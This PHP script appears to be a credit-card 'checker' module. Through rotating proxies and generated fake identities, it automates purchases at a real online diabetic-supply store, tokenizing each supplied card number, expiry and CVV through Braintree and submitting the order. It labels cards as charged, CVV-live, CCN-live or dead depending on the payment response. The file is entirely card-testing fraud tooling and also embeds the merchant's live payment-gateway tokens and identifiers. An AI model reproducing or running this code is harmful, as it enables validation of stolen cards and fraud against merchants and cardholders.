<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$cookie = uniqid();

$fake = $this->tools->GetUser();

$data = 'attribute_pa_color=black&quantity=1&add-to-cart=141413&product_id=141413&variation_id=141471';

$r1 = $this->curlx->Post('https://diabeticoutlet.com/product/glucology-patches-for-dexcom-g6-sensor-25-pack/', $data, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$r2 = $this->curlx->Get('https://diabeticoutlet.com/checkout/', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$security = trim(strip_tags($this->getstr($r2->body, 'update_order_review_nonce":"', '"')));

$nonce_v1 = trim(strip_tags($this->getstr($r2->body, 'woocommerce-process-checkout-nonce" value="', '"')));

if (empty($security) || empty($nonce_v1)) {
	$empty = 'Second Request Tokens are Empty';

	goto start;
}

$authorization = trim(strip_tags($this->getstr($r2->body, 'wc_braintree_client_token = ["', '"')));

if (empty($authorization)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$b3_data = json_decode(base64_decode($authorization));

if (!isset($b3_data->authorizationFingerprint, $b3_data->merchantId)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$authorizationFingerprint = $b3_data->authorizationFingerprint;

$sessionId = substr($fake->guid, 0, -6);

$correlation_id = $this->tools->GenPass(32);

$data = 'security='.$security.'&payment_method=braintree_cc&country=US&state=NY&postcode=1050&city=Brewster&address=12+main+street&s_country=US&s_state=NY&s_postcode=1050&s_city=Brewster&s_address=12+main+street&has_full_address=true&post_data=billing_first_name%3D'.$fake->first.'%26billing_last_name%3D'.$fake->last.'%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D12%2520main%2520street%26billing_city%3DBrewster%26billing_state%3DNY%26billing_postcode%3D1050%26billing_phone%3D%26billing_email%3D%26b2bking_js_based_invalid%3D0%26account_password%3D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26order_comments%3D%26shipping_method%255B0%255D%3Dfree_shipping%253A2%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%257B%2522device_session_id%2522%253A%2522'.$sessionId.'%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522'.$correlation_id.'%2522%257D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%257B%2522device_session_id%2522%253A%2522'.$sessionId.'%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522'.$correlation_id.'%2522%257D%26braintree_googlepay_nonce_key%3D%26braintree_googlepay_device_data%3D%257B%2522device_session_id%2522%253A%2522'.$sessionId.'%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522'.$correlation_id.'%2522%257D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%257B%2522device_session_id%2522%253A%2522'.$sessionId.'%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522'.$correlation_id.'%2522%257D%26braintree_venmo_nonce_key%3D%26braintree_venmo_device_data%3D%257B%2522device_session_id%2522%253A%2522'.$sessionId.'%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522'.$correlation_id.'%2522%257D%26wcpay-payment-method%3D%26wcpay-is-platform-payment-method%3D%26woocommerce-process-checkout-nonce%3D'.$nonce_v1.'%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review&shipping_method%5B0%5D=free_shipping%3A2';

$r3 = $this->curlx->Post('https://diabeticoutlet.com/?wc-ajax=update_order_review', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$nonce_v2 = trim(strip_tags($this->getstr($r3->body, 'woocommerce-process-checkout-nonce\" value=\"', '\"')));

if (empty($nonce_v2)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$sessionId.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yyyy.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10509","streetAddress":"12 main street"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';

$headers = [
	"authorization: Bearer $authorizationFingerprint",
	'braintree-version: 2018-05-10',
	'content-type: application/json'
];

$r4 = $this->curlx->Post('https://payments.braintree-api.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$token = $this->getstr($r4->body, 'token":"', '"');

if (empty($token)) {
	$empty = 'Fourth Request Token is Empty';

	goto start;
}

$data = 'billing_first_name='.$fake->first.'&billing_last_name='.$fake->last.'&billing_company=&billing_country=US&billing_address_1=12+main+street&billing_city=Brewster&billing_state=NY&billing_postcode=10509&billing_phone=2564567654&billing_email='.urlencode($fake->email).'&b2bking_js_based_invalid=0&account_password=%23CBAzyx321%24&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=free_shipping%3A2&payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%22'.$sessionId.'%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22'.$correlation_id.'%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Ftwtvzzn6289kf6g6%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Ftwtvzzn6289kf6g6%22%7D%2C%22merchantId%22%3A%22twtvzzn6289kf6g6%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22braintreeApi%22%3A%7B%22accessToken%22%3A%22'.urlencode($authorization).'%22%2C%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%22%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22twtvzzn6289kf6g6%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%2C%22Discover%22%2C%22JCB%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Diabetic+Outlet%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NzU5MDEzMzksImp0aSI6ImNiNTBiM2VjLTY2MDktNGJjYi04MzhjLWY3MGFlN2MwMDlkOCIsInN1YiI6InR3dHZ6em42Mjg5a2Y2ZzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InR3dHZ6em42Mjg5a2Y2ZzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.m9_7Tm1JrMW-kYGeS5Ke3frr-Uabi3wganVOX0PRsnCTkD122xlHAox4AD-w88G-qw3V1kBkx74bl3sMIfUN_A%22%2C%22paypalClientId%22%3A%22AVKivKsfVBLJEnt2W-h_5PzCfpMcIULpKNHyk0PqQqH15VnTESd_xDMqStqHoBoHhXOJ3fv400lP0HXi%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22payWithVenmo%22%3A%7B%22merchantId%22%3A%223464942771345472165%22%2C%22accessToken%22%3A%22access_token%24production%24twtvzzn6289kf6g6%249579dc89a92e8adb7935723288678a14%22%2C%22environment%22%3A%22production%22%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Diabetic+Outlet%22%2C%22clientId%22%3A%22AVKivKsfVBLJEnt2W-h_5PzCfpMcIULpKNHyk0PqQqH15VnTESd_xDMqStqHoBoHhXOJ3fv400lP0HXi%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fdiabeticoutlet.com%2Fprivacy-policy%2F%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fdiabeticoutlet.com%2Fterms-of-website-use%2F%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22diabeticoutlet_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%2C%22usBankAccount%22%3A%7B%22routeId%22%3A%22route_bjv5c3_6rd39t_ws6z65_cr4rp4_xj5%22%2C%22plaid%22%3A%7B%22publicKey%22%3Anull%7D%7D%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22device_session_id%22%3A%22'.$sessionId.'%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22'.$correlation_id.'%22%7D&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=%7B%22device_session_id%22%3A%22'.$sessionId.'%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22'.$correlation_id.'%22%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22device_session_id%22%3A%22'.$sessionId.'%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22'.$correlation_id.'%22%7D&braintree_venmo_nonce_key=&braintree_venmo_device_data=%7B%22device_session_id%22%3A%22'.$sessionId.'%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22'.$correlation_id.'%22%7D&wcpay-payment-method=&wcpay-is-platform-payment-method=&woocommerce-process-checkout-nonce='.$nonce_v2.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';

$r5 = $this->curlx->Post('https://diabeticoutlet.com/?wc-ajax=checkout', $data, null, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$json_r5 = json_decode($r5->body);

if ($json_r5->result == 'success') {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CHARGED - Result -> Success!"];

	goto end;
}

$err = strip_tags($json_r5->messages);

if (empty($err)) {
	$r5 = $this->curlx->Get('https://diabeticoutlet.com/checkout/', null, $cookie, $server['proxy']);

	if (!$r5->success) goto start;

	$err = strip_tags($this->getstr($r5->body, '<ul class="woocommerce-error message-wrapper" role="alert">', '</ul>'));
}

$err = trim(preg_replace('/\s+/', ' ', str_replace(['There was an error processing your payment. Reason:', ''], '', $err)));

$status = ['status' => 'APPROVED', 'emoji' => '✅'];

if (strpos($err, 'card verification number does not match') !== false || strpos(strtolower($err), 'cvv') !== false) {
	$status['msg'] = "CCN CARD - {$err}!";
} elseif (strpos($err, 'does not match') !== false || strpos(strtolower($err), 'avs') !== false) {
	$status['msg'] = "CVV CARD - AVS FAILED -> {$err}!";
} elseif (strpos(strtolower($err), 'insufficient funds') !== false) {
	$status['msg'] = "CCN CARD - Insufficient Funds -> {$err}!";
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => 'DEAD - '.(empty($err) ? 'Unknown Error' : $err).'!'];
}

end: